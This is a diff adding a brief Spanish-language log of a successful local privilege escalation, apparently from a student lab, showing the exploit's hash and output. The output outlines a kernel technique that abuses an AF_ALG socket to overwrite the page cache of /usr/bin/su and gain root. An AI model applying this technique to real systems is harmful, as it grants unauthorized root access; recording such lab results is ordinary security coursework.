@@ -1,0 +1,13 @@
+=== HITO 2: EXPLOIT EXITOSO ===
+Fecha: Fri May 22 21:58:00 UTC 2026
+Hostname: copy-fail-Jordan-Reyes
+Identidad POST-exploit: uid=0(root) gid=1001(student) groups=1001(student)
+Kernel: 6.12.0
+SHA256 del exploit usado: a567d09b15f6e4440e70c9f2aa8edec8ed59f53301952df05c719aa3911687f9
+
+--- Salida del exploit ---
+[+] Opening AF_ALG socket (authencesn)...
+[+] Splicing target page cache for /usr/bin/su...
+[+] Forcing deterministic 4-byte write...
+[+] Executing modified su binary...
+uid=0(root) gid=1001(student) groups=1001(student)
